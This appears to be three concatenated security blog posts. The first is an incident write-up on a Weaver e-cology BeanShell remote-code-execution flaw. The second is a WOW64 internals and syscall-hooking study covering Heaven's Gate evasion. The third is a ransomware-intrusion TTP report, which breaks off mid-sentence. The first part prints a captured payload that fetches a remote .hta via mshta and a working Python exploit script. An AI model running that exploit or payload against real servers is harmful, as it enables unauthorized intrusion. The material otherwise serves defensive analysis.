2019-09-20 11:31:23 UTC+0000 This matched our initial findings and gave us some further context. Unfortunately, the initially-acquired forensic evidence, including the endpoint triage package and the memory image, did not provide a conclusive filesystem narrative around that date. At this stage the client had pulled the system offline and began remediation steps, however we still didn't know exactly which exploit was leveraged to gain a foothold on this system. We knew the process path which indicated it was httpd.exe being leveraged to run malicious javaw.exe commands. This lined up with our HTTP log analysis, yet we didn't have the payload. String it to Weaver Anybody who's worked in incident response long enough knows that when parsing the data has failed to uncover the evidence you're looking for, the last thing you can try is sifting through the raw bytes and strings of a file. Volatility has a handy feature to map the string offset to the corresponding process and virtual address. Once this is complete grep searching for specific keywords and filtering through the strings identified a number of HTTP POST requests sitting in unallocated space, expanding our grep using it's context parameter uncovered interesting HTTP POST requests and their payload. Example POST payload: POST /weaver/bsh.servlet.BshServlet/ HTTP/1.1 Host: x.x.x.x:88 Connection: close Accept-Encoding: gzip, deflate Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0 Accept-Language: en-US,en;q=0.5 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 134 bsh.script=eval .(\"ex\"+\"ec(\\\"mshta hxxp:// www[DOMAIN]/index[.]hta\\\")\");&bsh.servlet.output=raw23; languageidweaver=7; testBanCookie=test; JSESSIONID=xxxxxxxxxx; Systemlanguid=7 tBanCookie=test; Systemlanguid=7; loginidweaver=xxx st; Systemlanguid=7; loginidweaver=xxx We knew this was the exploit we were looking for. The payload was exactly what the attacker was executing and the URI confirmed the process path we had identified from the memory image. It was making a request to BshServlet . It was unclear if this vulnerability was known, as there was no CVE associated with the software. Open source research identified a number of Chinese blog sites discussing a newly identified RCE vulnerability with Weaver e-cology OA system. The vulnerability lies within the BeanShell component of the OA system. The attacker could send a specially crafted payload to ’\\weaver/bsh.servlet.BshServlet` in order to launch arbitrary commands. The following POC script was discovered on one of the aforementioned Chinese blog sites. MD5: 49b23c67c2a378fb8c76c348dd80ff61 import requests import sys headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'Accept-Language': 'zh-CN,zh;q=0.9', 'Content-Type': 'application/x-www-form-urlencoded' } def exploit(url,cmd): target=url+'/weaver/bsh.servlet.BshServlet' payload='bsh.script=eval%00(\"ex\"%2b\"ec(\\\\\"cmd+/c+{}\\\\\")\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'.format(cmd) res=requests.post(url=target,data=payload,headers=headers,timeout=10) res.encoding=res.apparent_encoding print(res.text) if __name__ == '__main__': url=sys.argv[1] while(1): cmd=input('cmd:') exploit(url,cmd) The script contained some hardcoded HTTP header values including user-agent, accepted data types, accepted languages and content-type. The script builds an HTTP request and allows the user to specify the command they would like to run; it would then append the URL and command to the crafted exploit to execute. In our instance the attacker was leveraging this vulnerability to launch mshta.exe to download a second stage payload. Using search engines for internet connected devices such as Shodan or Censys we can quickly identify systems running the Weaver e-cology platform. Using this technique, we identified 28 internet facing system that are potentially vulnerable. Conclusion This isn't a new story; Managed Defense responds to cases like this every week. The usage of FOMB was particularly interesting in this instance and it's the first case in Managed Defense we've seen this technique being leveraged in an attempt to bypass defenses. When leveraged correctly, compiled “.bmf” files can be effectively used to sneak into an environment undetected and gain a foothold via persistence in the WMI buffer. There are many procedural and technical controls that could help prevent a system being compromised. Most larger enterprises are complex and identifying all publicly exposed software and services can be challenging. We’ve worked on many cases where system administrators didn’t believe their system was directly accessible from the internet only to later confirm it was. Prioritizing particular patches can be difficult and if you don’t think a RCE vulnerability is exposed then the Risk level might be incorrectly classified as low. A combination of controls is typically the best approach. In Managed Defense we assume these controls are imperfect and attackers will find a way to bypass them. Deploying strong monitoring capabilities combined with a team of analysts hunting through lower fidelity signatures or “weak signals” can uncover otherwise unnoticed adversaries.

                "text": "Microsoft is known for their backwards compatibility. When they rolled out the 64-bit variant of Windows years ago they needed to provide compatibility with existing 32-bit applications. In order to provide seamless execution regardless of application bitness, the WoW (Windows on Windows) system was coined. This layer, which will be referred to as ‘WOW64’ from here on out, is responsible for translating all Windows API calls from 32-bit userspace to the 64-bit operating system kernel. This blog post is broken up into two sections. First we start by diving deep into the WOW64 system. To do this, we trace a call from 32-bit userspace and follow the steps it takes to finally transition to the kernel. The second part of the post assesses two hooking techniques and their effectiveness. I will cover how this system works, the ways malware abuses it, and detail a mechanism by which all WoW syscalls can be hooked from userspace. Note that all information here is true as of Windows 10, version 2004 and in some cases has changed from how previous Windows versions were implemented. Recognition First and foremost, this is a topic which has existing research by multiple authors. This work was critical in efficient exploration of the internals and research would have taken much longer had these authors not publicly posted their awesome work. I would like to callout the following references: ( wbenny ): An extremely detailed view of WOW64 internals on ARM ( ReWolf ): A PoC heaven’s gate implementation ( JustasMasiulis ): A very clean C++ heaven’s gate implementation ( MalwareTech ): A WOW64 segmentation explanation WOW64 Internals To understand how the WOW64 system works internally we will explore the call sequence starting in 32-bit usermode before transitioning into the kernel from within a system DLL. Within these system DLLs the operating system will check arguments and eventually transition to a stub known as a syscall stub. This syscall stub is responsible for servicing the API call in the kernel. On a 64-bit system, the syscall stub is straightforward as it directly executes the syscall instruction as shown in Figure 1. Figure 1: Native x64 Syscall Stub Figure 2 shows a syscall stub for a 32-bit process running on WOW64 Figure 2: WOW64 Syscall Stub Notice that instead of a syscall instruction in the WOW64 version, Wow64SystemServiceCall is called. In the WOW64 system what would normally be an entry into the kernel is instead replaced by a call to a usermode routine. Following this Wow64SystemServiceCall , we can see in Figure 3 that it immediately performs an indirect jmp through a pointer named Wow64Transition . Figure 3: Wow64SystemService transitions through a pointer ‘Wow64Transition’ Note that the Wow64SystemServiceCall function is found within ntdll labeled as ntdll_77550000; a WOW64 process has two ntdll modules loaded, a 32-bit one and a 64-bit one. WinDbg differentiates between these two by placing the address of the module after the 32-bit variant. The 64-bit ntdll can be found in %WINDIR%\\System32 and the 32-bit in %WINDIR%\\SysWOW64. In the PDBs, the 64bit and 32bit ntdlls are referred to as ntdll.pdb and wntdll.pdb respectively, try loading them in a disassembler! Continuing with the call trace, if we look at what the Wow64Transition pointer holds we can see its destination is wow64cpu!KiFastSystemCall . As an aside, note that the address of wow64cpu!KiFastSystemCall is held in the 32-bit TEB (Thread Environment Block) via member WOW32Reserved, this isn’t relevant for this trace but is useful to know. In Figure 4 we see the body of KiFastSystemCall . Figure 4: KiFastSystemCall transitions to x64 mode via segment selector 0x33 The KiFastSystemCall performs a jmp using the 0x33 segment selector to a memory location just after the instruction. This 0x33 segment transitions the CPU into 64-bit mode via a GDT entry as described by (MalwareTech). Let's recap the trace we've performed to this point. We started from a call in ntdll, NtResumeThread. This function calls the Wow64SystemServiceCall function which then executes the Wow64Transition. The KiFastSystemCall performs the transition from 32-bit to 64-bit execution. The flow is shown in Figure 5. Figure 5: 32-bit to 64-bit transition The destination of the CPU transition jump is the 64-bit code show in Figure 6. Figure 6: Destination of KiFastSystemCall Figure 6 shows the first 64-bit instruction we’ve seen executed in this call trace so far. In order to understand it, we need to look at how the WOW64 system initializes itself. For a detailed explanation of this refer to (wbenny). For now, we can look at the important parts in wow64cpu!RunSimulatedCode . Figure 7: 64bit registers are saved in RunSimulatedCode Figure 7 depicts the retrieval of the 64-bit TEB which is used to access Thread Local Storage at slot index 1. Then the moving of a function pointer table into register r15. The TLS data retrieved is an undocumented data structure WOW64_CPURESERVED that contains register data and CPU state information used by the WOW64 layer to set and restore registers across the 32-bit and 64-bit boundaries. Within this structure is the WOW64_CONTEXT structure, partially documented on the Microsoft website . I have listed both structures at the end of this post. We’ll look at how this context structure is used later, but for our understanding of the jmp earlier all we need to know is that r15 is a function pointer table. It’s interesting to note at this point the architecture of the WOW64 layer. From the perspective of the 64-bit kernel the execution of 32-bit (Wow64) usermode applications is essentially a big while loop. The loop executes x86 instructions in the processor's 32-bit execution mode and occasionally exits the loop to service a system call. Because the kernel is 64-bit, the processor mode is temporarily switched to 64-bit, the system call serviced, then the mode switched back and the loop continued where it was paused. One could say the WOW64 layer acts like an emulator where the instructions are instead executed on the physical CPU. Going back to the jmp instruction we saw in Figure 6, we now know what is occurring. The instruction jmp [r15 + 0xF8] is equivalent to the C code jmp TurboThunkDispatch[0xF8 / sizeof(uint64_t)]. Looking at the function pointer at this index we can see we’re at the function wow64cpu!CpupReturnFromSimulatedCode (Figure 8). Figure 8: TurboThunk table's last function pointer entry is an exit routine This routine is responsible for saving the state of the 32-bit registers into the WOW64_CONTEXT structure we mentioned before as well as retrieving the arguments for the syscall. There is some trickiness going on here, so let’s examine this in detail. First a pointer to the stack is moved into r14 via xchg, the value at this location will be the return address from the syscall stub where Wow64SystemServiceCall was called. The stack pointer r14 is then incremented by 4 to get a pointer to where the stack should be reset when it’s time to restore all these context values. These two values are then stored in the context’s EIP and ESP variables respectively. The r14 stack pointer is then incremented one more time to get the location where the __stdcall arguments are (remember stdcall passes all arguments on the stack). This argument array is important for later, remember it. The arguments pointer is moved into r11, so in C this means that r11 is equivalent to an array of stack slots where each slot is an argument uint32_t r11[argCount]. The rest of the registers and EFlags are then saved. Once the 32-bit context is saved, the WOW64 layer then calculates the appropriate TurboThunk to invoke by grabbing the upper 16 bits of the syscall number and dispatches to that thunk. Note that at the beginning of this array is the function TurboDispatchJumpAddressEnd , shown in Figure 9, which is invoked for functions that do not support TurboThunks. Figure 9: TurboThunk table's first function pointer entry is an entry routine TurboThunks are described by (wbenny)—read his blog post at this point if you have not. To summarize the post, for functions that have simple arguments with widths <= sizeof(uint32_t) the WOW64 layer will directly widen these arguments to 64 bits via zero or sign-extension and then perform a direct syscall into the kernel. This all occurs within wow64cpu, rather than executing a more complex path detailed as follows. This acts as an optimization. For more complex functions that do not support TurboThunks the TurboDispatchJumpAddressEnd stub is used which dispatches to wow64!SystemServiceEx to perform the system call as shown in Figure 10. Figure 10: Complex system calls go through Wow64SystemServiceEx We’ll look at this routine in a moment as it’s the meat of this blog post, but for now let’s finish this call trace. Once Wow64SystemServiceEx returns from doing the system call the return value in eax is moved into the WOW64_CONTEXT structure and then the 32-bit register states are restored. There’s two paths for this, a common case and a case that appears to exist only to be used by NtContinue and other WOW64 internals. A flag at the start of the WOW64_CPURESERVED structure retrieved from the TLS slot is checked, and controls which restore path to follow as shown in Figure 11. Figure 11: CPU state is restored once the system call is done; there’s a simple path and a complex one handling XMM registers The simpler case will build a jmp that uses the segment selector 0x23 to transition back to 32-bit mode after restoring all the saved registers in the WOW64_CONTEXT . The more complex case will additionally restore some segments, xmm values, and the saved registers in the WOW64_CONTEXT structure and then will do an iret to transition back. The common case jmp once built is shown in Figure 12. Figure 12: Dynamically built jmp to transition back to 32bit mode At this point our call trace is complete. The WOW64 layer has transitioned back to 32-bit mode and will continue execution at the ret after Wow64SystemServiceCall in the syscall stub we started with. Now that an understanding of the flow of the WOW64 layer itself is understood, let’s examine the Wow64SystemServiceEx call we glossed over before. A little bit into the Wow64SystemServiceEx routine, Figure 13 shows some interesting logic that we will use later. Figure 13: Logging routines invoked before and after dispatching the syscalls The routine starts by indexing into service tables which hold pointers to routines that convert the passed argument array into the wider 64-bit types expected by the regular 64-bit system modules. This argument array is exactly the stack slot that was stored earlier in r14. Two calls to the LogService function exist, however these are only called if the DLL %WINDIR%\\system32\\wow64log.dll is loaded and has the exports Wow64LogInitialize, Wow64LogSystemService, Wow64LogMessageArgList, and Wow64LogTerminate. This DLL is not present on Windows by default, but it can be placed there with administrator privileges. The next section will detail how this logging DLL can be used to hook syscalls that transition through this wow64layer. Because the logging routine LogService is invoked before and after the syscall is serviced we can achieve a standard looking inline hook style callback function capable of inspecting arguments and return values. Bypassing Inline Hooks As described in this blog post, Windows provides a way for 32-bit applications to execute 64-bit syscalls on a 64-bit system using the WOW64 layer. However, the segmentation switch we noted earlier can be manually performed, and 64-bit shellcode can be written to setup a syscall. This technique is popularly called “Heaven’s Gate”. JustasMasiulis’ work call_function64 can be used as a reference to see how this may be done in practice (JustasMasiulis). When system calls are performed this way the 32-bit syscall stub that the WOW64 layer uses is completely skipped in the execution chain. This is unfortunate for security products or tracing tools because any inline hooks in-place on these stubs are also bypassed. Malware authors know this and utilize “Heaven’s Gate” as a bypass technique in some cases. Figure 14 and Figure 15 shows the execution flow of a regular syscall stub through the WOW64 layer, and hooked syscall stub where malware utilizes “Heaven’s Gate”. Figure 14: NtResumeThread transitioning through the WOW64 layer Figure 15: NtResumeThread inline hook before transitioning through the WOW64 layer As seen in Figure 15, when using the Heaven’s Gate technique, execution begins after the inline hook and WOW64 layer is done. This is an effective bypass technique, but one that is easy to detect from a lower level such as a driver or hypervisor. The easiest bypass to inline hooks is simply to restore the original function bytes, usually from bytes on disk. Malware such as AgentTesla and Conti has been known to utilize this last evasion technique. Hooking WOW64 via Inline Hooks As a malware analyst being able to detect when samples attempt to bypass the WOW64 layer can be very useful. The obvious technique to detect this is to place inline hooks on the 64-bit syscall stubs as well as the 32-bit syscall stubs. If the 64-bit hook detects an invocation that didn’t also pass through the 32-bit hook, then it’s known that a sample is utilizing Heaven’s Gate. This technique can detect both evasion techniques previously detailed. However, in practice this is very difficult to implement. Looking at the requirements that must be satisfied to hook the 64-bit syscall stub we come up with this list: Install 64-bit hook from a 32-bit module How do you read/write 64-bit address space from a 32-bit module? Implement a 64-bit callback from a 32-bit module Typically, inline hooking uses C functions as callback stubs, but we’re compiling a 32-bit module so we’ll have a 32-bit callback instead of the required 64-bit one. To solve the first challenge ntdll kindly provides the exports NtWow64ReadVirtualMemory64 , NtWow64WriteVirtualMemory64 , and NtWow64QueryInformationProcess64 . Using these it is possible to read memory, write memory, and retrieve the PEB of a 64-bit module from a 32-bit process. However, the second challenge is much harder as either shellcode or a JIT will be required to craft a callback stub of the right bitness. In practice ASMJIT may be utilized for this. This is however a very tedious technique to trace a large number of APIs. There are other challenges to this technique as well. For example, in modern Windows 10 the base address of ntdll64 is set to a high 64-bit address rather than a lower 32-bit address as in Windows 7. Due to this, supporting returns from callbacks back up to the original hooked stub and allocating a trampoline within the required memory range is difficult since the standard ret instruction doesn’t have enough bits on the stack to represent the 64-bit return address. As an aside, it should be noted that the WOW64 layer contains what is likely a bug when dealing with the NtWow64* functions. These APIs all take a HANDLE as first argument, which should be sign extended to 64-bits. However, this does not occur for these APIs, therefore when using the pseudo handle -1 the call fails with STATUS_INVALID_HANDLE . This bug was introduced in an unknown Windows 10 version. To successfully use these APIs OpenProcess must be used to retrieve a real, positive valued handle. I will not be covering the internals of how to inline hook the 64-bit syscall stub since this post is already very long. Instead I will show how my hooking library PolyHook2 can be extended to support cross-architecture hooking using these Windows APIs, and leave the rest as an exercise to the reader. This works because PolyHook’s trampolines are not limited to +-2GB and do not spoil registers. The internals of how that is achieved is a topic for another post. Figure 16 depicts how to overload the C++ API of polyhook to read/write memory using the aforementioned WinAPIs. Figure 16: Overloading the memory operations to read/write/protect 64-bit memory Once these inline hooks are in-place on the 64-bit syscall stubs, any application utilizing Heaven’s Gate will be properly intercepted. This hooking technique is very invasive and complicated and can still be bypassed if a sample was to directly execute a syscall instruction rather than using the 64-bit module’s syscalls stub. Therefore, a driver or hypervisor is more suitable to detect this evasion technique. Instead we can focus on the more common byte restoration evasion techniques and look for a way to hook the WOW64 layer itself. This doesn’t involve assembly modifications at all. Hooking WOW64 via LogService Thinking back to the WOW64 layer’s execution flow we know that all calls which are sent through the Wow64SystemServiceEx routine may invoke the routine Wow64LogSystemService if the logging DLL is loaded. We can utilize this logging DLL and routine to implement hooks which can be written the exact same way as inline hooks, without modifying any assembly. The first step to implementing this is to force all API call paths through the Wow64SystemServiceEx routine so that the log routine may be called. Remember earlier that those that support TurboThunks will not take this path. Lucky for us we know that any TurboThunk entry that points to TurboDispatchJumpAddressEnd will take this path. Therefore, by pointing every entry in the TurboThunk table to point at that address, the desired behavior is achieved. Windows kindly implements this patching via wow64cpu!BTCpuTurboThunkControl as shown in Figure 17. Figure 17: Patching the TurboThunk table is implemented for us Note that in previous Windows versions the module which exported this and how it did is different to Windows 10, version 2004. After invoking this patch routine all syscall paths through WOW64 go through Wow64SystemServiceEx and we can focus on crafting a logging DLL that man-in-the-middles (MITMs) all calls. There are a couple of challenges to be considered here: How do we determine which system call is currently occurring from the logging DLL? How are callbacks written? Wow64log is 64-bit DLL, we’d like a 32-bit callback. Is shellcode required, or can we make nice C style function callbacks? What APIs may we call? All that’s loaded is 64-bit ntdll. The first concern is rather easy, from within the wow64log DLL we can read the syscall number from the syscall stubs to create a map of number to name. This is possible because syscall stubs always start with the same assembly and the syscall number is at a static offset of 0x4. Figure 18 shows how we can then compare the values in this map against the syscall number passed to Wow64LogSystemService ’s parameter structure WOW64_LOG_SERVICE . typedef uint32_t* WOW64_ARGUMENTS; struct WOW64_LOG_SERVICE { uint64_t BtLdrEntry; WOW64_ARGUMENTS Arguments; ULONG ServiceTable; ULONG ServiceNumber; NTSTATUS Status; BOOLEAN PostCall; }; EXTERN_C __declspec(dllexport) NTSTATUS NTAPI Wow64LogSystemService(WOW64_LOG_SERVICE* service) { for (uint32_t i = 0; i < LAST_SYSCALL_ID; i++) { const char* sysname = SysCallMap[i].name; uint32_t syscallNum = SysCallMap[i].SystemCallNumber; if (ServiceParameters->ServiceNumber != syscallNum) continue; //LOG sysname } } Figure 18: Minimal example of determining which syscall is occurring—in practice the service table must be checked too Writing callbacks is a bit more challenging. The wow64log DLL is executing in 64-bit mode and we’d like to be able to write callbacks in 32-bit mode since it’s very easy to load additional 32-bit modules into a WOW64 process. The best way to handle this is to write shellcode which is capable of transitioning back to 32-bit mode, execute the callback, then go back to 64-bit mode to continue execution in the wow64log DLL. The segment transitions themselves are rather easy at this point, we know we just need to use 0x23 or 0x33 segment selectors when jumping. But we also need to deal with the calling convention differences between 64-bit and 32-bit. Our shellcode will therefore be responsible for moving 64-bit arguments’ register/stack slots to the 32-bit arguments register/stack slots. Enforcing that 32-bit callbacks may only be __cdecl makes this easier as all arguments are on the stack and the shellcode has full control of stack layout and cleanup. Figure 19 shows the locations of the arguments for each calling convention. Once the first 4 arguments are relocated all further arguments can be moved in a loop since it’s simply moving stack values into lower slots. This is relatively easy to implement using external masm files in MSVC. Raw bytes will need to be emitted at points rather than using the assembler due to the mix of architectures. Alternatively, GCC or Clang inline assembly could be used. ReWolf’s work achieves the opposite direction of 32-bit -> 64-bit and implements the shellcode via msvc inline asm. X64 MSVC doesn’t support this and there are complications with REX prefixes when using that method. It’s nicer to use external masm files and rely on the linker to implement this shellcode. Arg Number Cdecl Location Fastcall Location Special Case? 0 [ebp + 8] rcx Yes 1 [ebp + 12] rdx Yes 2 [ebp + 16] r8d Yes 3 [ebp + 20] r9d Yes 4 [ebp + 24] [rbp + 32 + 8] No 5 [ebp + 28] [rbp + 32 + 16] No 6 [ebp + 32] [rbp + 32 + 24] No Figure 19: Cdecl vs Fastcall argument positions Once this shellcode is written and wrapped into a nice C++ function, it’s possible for the wow64log DLL to invoke the callback via a simple C style function pointer call shown in Figure 20. Figure 20: call_function32 invokes shellcode to call a 32-bit callback from the 64-bit logging DLL From within the 32-bit callback any desired MITM operations can be performed, but restrictions exist on which APIs are callable. Due to the context saving that the WOW64 layer performs, 32-bit APIs that would re-enter the WOW64 layer may not be called as the context values would be corrupted. We are therefore limited to only APIs that won’t re-enter WOW64, which are those that are exported from the 64-bit ntdll. The NtWriteFile export may be used to easily write to stdout or a file, but we must re-enter the 64-bit execution mode and do the inverse argument mapping as before. This logging routine can be called from within the 32-bit callbacks and is shown in Figure 21 and Figure 22. Figure 21: call_function64 invokes shellcode to call the 64bit WriteFile from with the 32bit callback Figure 22: 32bit callbacks must log via routines that only call non-reentrant WOW64 APIs The result is clean looking callback stubs that function exactly how inline hooks might, but with zero assembly modifications required. Arguments can easily be manipulated as well, but the return status may not be modified unless a little stack walk hackery is implemented. The only other consideration is that the wow64log DLL itself needs to be carefully crafted to not build with any CRT mechanisms. The flags required are: Disable CRT with /NODEFAULT LIB (all C APIs now unavailable), set a new entry point name to not init CRT NtDllMain Disable all CRT security routines /GS- Disable C++ exceptions Remove default linker libraries, only link ntdll.lib Use extern “C” __declspec(dllimport) <typedef> to link against the correct NtApis An example of a program hooking its own system calls via wow64log inline hooks is shown in Figure 23. Figure 23: Demonstration of inline hooks in action Conclusion Using inline WOW64 hooks, wow64log hooks, and kernel/hypervisor hooks, all techniques of usermode hook evasion can be identified easily and automatically. Detecting which layers of hooks are skipped or bypassed will give insight into which evasion technique is employed.

                "text": "Throughout 2020, ransomware activity has become increasingly prolific, relying on an ecosystem of distinct but co-enabling operations to gain access to targets of interest before conducting extortion. Mandiant Threat Intelligence has tracked several loader and backdoor campaigns that lead to the post-compromise deployment of ransomware, sometimes within 24 hours of initial compromise . Effective and fast detection of these campaigns is key to mitigating this threat . The malware families enabling these attacks previously reported by Mandiant to intelligence subscribers include KEGTAP/BEERBOT, SINGLEMALT/STILLBOT and WINEKEY/CORKBOT. While these malware families communicate with the same command and control infrastructure (C2) and are close to functional parity, there are minimal code overlaps across them. Other security researchers have tracked these malware families under the names BazarLoader and BazarBackdoor or Team9 . The operators conducting these campaigns have actively targeted hospitals, retirement communities, and medical centers, even in the midst of a global health crisis , demonstrating a clear disregard for human life. Email Campaign TTPs Campaigns distributing KEGTAP, SINGLEMALT and WINEKEY have been sent to individuals at organizations across a broad range of industries and geographies using a series of shifting delivery tactics, techniques and procedures (TTPs). Despite the frequent changes seen across these campaigns, the following has remained consistent across recent activity: Emails contain an in-line link to an actor-controlled Google Docs document, typically a PDF file. This document contains an in-line link to a URL hosting a malware payload. Emails masquerade as generic corporate communications, including follow-ups about documents and phone calls or emails crafted to appear related to complaints, terminations, bonuses, contracts, working schedules, surveys or queries about business hours. Some email communications have included the recipient’s name or employer name in the subject line and/or email body. Despite this uniformity, the associated TTPs have otherwise changed regularly—both between campaigns and across multiple spam runs seen in the same day. Notable ways that these campaigns have varied over time include: Early campaigns were delivered via Sendgrid and included in-line links to Sendgrid URLs that would redirect users to attacker-created Google documents. In contrast, recent campaigns have been delivered via attacker-controlled or compromised email infrastructure and have commonly contained in-line links to attacker-created Google documents, although they have also used links associated with the Constant Contact service. The documents loaded by these in-line links are crafted to appear somewhat relevant to the theme of the email campaign and contain additional links along with instructions directing users to click on them. When clicked, these links download malware binaries with file names masquerading as document files. Across earlier campaigns these malware binaries were hosted on compromised infrastructure, however, the attackers have shifted to hosting their malware on legitimate web services, including Google Drive, Basecamp, Slack, Trello, Yougile, and JetBrains. In recent campaigns, the malware payloads have been hosted on numerous URLs associated with one or more of these legitimate services. In cases where the payloads have been taken down, the actors have sometimes updated their Google documents to contain new, working links. Some campaigns have also incorporated customization, including emails with internal references to the recipients’ organizations (Figure 1) and organizations’ logos embedded into the Google Docs documents (Figure 2). Figure 1: Email containing internal references to target an organization’s name Figure 2: Google Docs PDF document containing a target organization’s logo Hiding the final payload behind multiple links is a simple yet effective way to bypass some email filtering technologies. Various technologies have the ability to follow links in an email to try to identify malware or malicious domains; however, the number of links followed can vary. Additionally, embedding links within a PDF document further makes automated detection and link-following difficult. Post-Compromise TTPs Given the possibility that accesses obtained from these campaigns may be provided to various operators to monetize, the latter-stage TTPs, including ransomware family deployed, may vary across intrusions. A notable majority of cases where Mandiant has had visibility into these post-compromise TTPs have been attributable to UNC1878, a financially motivated actor that monetizes network access via the deployment of RYUK ransomware. Establish Foothold Once the loader and backdoor have been executed on the initial victim host, the actors have used this initial backdoor to download POWERTRICK and/or Cobalt Strike BEACON payloads to establish a foothold. Notably, the respective loader and backdoor as well as POWERTRICK have typically been installed on a small number of hosts in observed incidents, suggesting these payloads may be reserved for establishing a foothold and performing initial network and host reconnaissance. However, BEACON is frequently found on a larger number of hosts and used throughout various stages of the attack lifecycle. Maintain Presence Beyond the preliminary phases of each intrusion, we have seen variations in how these attackers have maintained presence after establishing an initial foothold or moving laterally within a network. In addition to the use of common post-exploitation frameworks such as Cobalt Strike, Metasploit and EMPIRE, we have observed the use of other backdoors, including ANCHOR, that we also believe to be under control of the actors behind TrickBot. The loaders associated with this activity can maintain persistence through reboot by using at least four different techniques, including creating a scheduled task, adding itself to the startup folder as a shortcut, creating a scheduled Microsoft BITS job using /setnotifycmdline, and adding itself to the Userinit value under the following registry key: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon. Actors have downloaded POWERTRICK, Metasploit Meterpreter, and Cobalt Strike BEACON payloads following the initial compromise. BEACON payloads have commonly been executed after moving laterally to new hosts within the victim network. The attackers have employed Cobalt Strike payloads crafted to maintain persistence through reboot via a scheduled task on critical systems in victim environments. Notably, BEACON is the backdoor observed most frequently across these incidents. We have observed actors executing encoded PowerShell commands that ultimately executed instances of the PowerShell EMPIRE backdoor. The actors were observed using BEACON to execute PowerLurk's Register-MaliciousWmiEvent cmdlet to register WMI events used to kill processes related to security tools and utilities, including Task Manager, WireShark, TCPView, ProcDump, Process Explorer, Process Monitor, NetStat, PSLoggedOn, LogonSessions, Process Hacker, Autoruns, AutorunsSC, RegEdit, and RegShot. In at least once case, attackers have maintained access to a victim environment using stolen credentials to access corporate VPN infrastructure configured to require only single-factor authentication. Escalate Privileges The most commonly observed methods for escalating privileges in these incidents have involved the use of valid credentials. The actors used a variety of techniques for accessing credentials stored in memory or on disk to access privileged accounts. The actors used valid credentials obtained using MimiKatz variants to escalate privileges. We’ve observed Mimikatz being executed both from the file system of victim hosts and via PowerShell cmdlets executed via Cobalt Strike BEACON. Actors have gained access to credentials via exported copies of the ntds.dit Active Directory database and SYSTEM and SECURITY registry hives from a Domain Controller. In multiple instances, the actors have launched attacks against Kerberos, including the use of RUBEUS, the MimiKatz Kerberos module, and the Invoke-Kerberoast cmdlet. Reconnaissance The approaches taken to perform host and network reconnaissance across these incidents varied; however, a significant portion of observed reconnaissance activity has revolved around Activity Directory enumeration using publicly available utilities such as BLOODHOUND, SHARPHOUND or ADFind, as well as the execution of PowerShell cmdlets using Cobalt Strike BEACON. BEACON has been installed on a large number of systems across these intrusions and has been used to execute various reconnaissance commands including both built-in host commands and PowerShell cmdlets. Observed PowerShell cmdlets include: Get-GPPPassword Invoke-AllChecks Invoke-BloodHound Invoke-EternalBlue Invoke-FileFinder Invoke-HostRecon Invoke-Inveigh Invoke-Kerberoast Invoke-LoginPrompt Invoke-mimikittenz Invoke-ShareFinder Invoke-UserHunter Mandiant has observed actors using POWERTRICK to execute built-in system commands on the initial victim host, including ipconfig , findstr , and cmd.exe. The actors leveraged publicly available utilities Adfind, BLOODHOUND, SHARPHOUND, and KERBRUTE on victim networks to collect Active Directory information and credentials. WMIC commands have been used to perform host reconnaissance, including listing installed software, listing running processes, and identifying operating system and system architecture. The actors have used a batch script to ping all servers identified during Active Directory enumeration and output the results to res.txt . The actors used the Nltest command to list domain controllers. Lateral Movement Lateral movement was most commonly accomplished using valid credentials in combination with Cobalt Strike BEACON, RDP and SMB, or using the same backdoors used to establish a foothold in victim networks. The actors have regularly leveraged Cobalt Strike BEACON and Metasploit Meterpreter to move laterally within victim environments. The actors commonly moved laterally within victim environments using compromised accounts—both those belonging to regular users and accounts with administrative privileges. In addition to the use of common post-exploitation frameworks, lateral movement has also been achieved using WMIC commands and the Windows RDP and SMB protocols. The actors used the Windows net use command to connect to Windows admin shares to move laterally. Complete Mission Mandiant is directly aware of incidents involving KEGTAP that included the post-compromise deployment of RYUK ransomware. We have also observed instances where ANCHOR infections, another backdoor associated with the same actors, preceded CONTI or MAZE deployment. In at least one case, an executable was observed that was designed to exfiltrate files via SFTP to an attacker-controlled server. The actors have used Cobalt Strike BEACON to exfiltrate data created through network reconnaissance activities as well as user files. The actors were observed deleting their tools from victim hosts in an attempt to remove indicators of compromise. The actors have used their access to the victim network to deploy ransomware payloads. There is evidence to suggest that RYUK ransomware was likely deployed via PsExec, but other scripts or artifacts related to the distribution process were not available for forensic analysis. Hunting Strategies If an organization identifies a host with an active infection believed to be an instance of KEGTAP or a parallel malware family, the following containment actions are recommended. Note that due to the velocity of this intrusion activity, these actions should be taken in parallel. Isolate and perform a forensic review of any impacted systems. Review incoming emails to the user that owns the impacted device for emails matching the distribution campaigns, and take action to remove the messages from all mailboxes. Identify the URLs used by the phishing campaign and block them using proxy or network security devices. Reset credentials for any user accounts associated with execution of the malware. Perform an enterprise wide review for lateral movement authentication from the impacted systems. Check authentication logs from any single-factor remote access solutions that may exist (VPN, VDI, etc) and move towards multi-factor authentication (MFA) as soon as possible. An enterprise-wide effort should be made to identify host-based artifacts related to the execution of first-stage malware and all post-intrusion activity associated with this activity. Some baseline approaches to this have been captured as follows. Activity associated with the KEGTAP loader can often be identified via a review of system startup folders and Userinit values under the HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon registry key. %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\adobe.lnk Figure 3: Example LNK file associated with KEGTAP persistence within a system’s startup folders SINGLEMALT employs BITS to maintain persistence through reboot and can often be identified via a review of anomalous BITS jobs. SINGLEMALT uses a well-documented BITS persistence mechanism that intentionally creates a job to download a non-existent URL, which will trigger a failure event. The job is set to retry on a regular interval, thus ensuring the malware continues to run. To review the BITS job on a host run the command bitsadmin /list . Display name may be “Adobe Update”, “System autoupdate” or another generic value. Notify state may be set to Fail (Status 2). FileList URL value may be set to the local host or a URL that does not exist. The Notification Command Line value may contain the path to the SINGLEMALT sample and/or a command to move it to a new location then start it. The Retry Delay value will be set. WINEKEY maintains persistence 